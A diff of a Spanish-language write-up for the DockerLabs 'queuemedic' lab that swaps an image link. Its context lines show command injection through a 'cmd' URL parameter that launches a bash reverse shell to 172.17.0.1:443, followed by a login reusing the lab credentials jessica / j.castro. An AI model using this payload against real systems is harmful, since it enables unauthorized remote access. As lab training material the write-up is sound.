@@ -99,7 +99,8 @@ y colocamos el buscador así:  172.17.0.2/?cmd=ls -la&page= y aquí colocamos el
 ahora la URL debe quedar así:  172.17.0.2/?cmd=bash -c 'bash -i >%26/dev/tcp/172.17.0.1/443 0>%261'&page= y aquí colocamos el código que nos dio
 
 dejamos la terminal en escucha y lanzamos
-![[dockerlabs/dificil/queuemedic/conexion.png]]
+
+![image](https://github.com/user-attachments/assets/30de1100-7353-4a00-8bad-3bf59efb6db9)
 
 y estamos dentro, buscando no encontré mucho y probé con las mismas credenciales ya que no hay otro usuario aparte de jessica y root:  jessica / j.castro
 ![[jessica.png]]
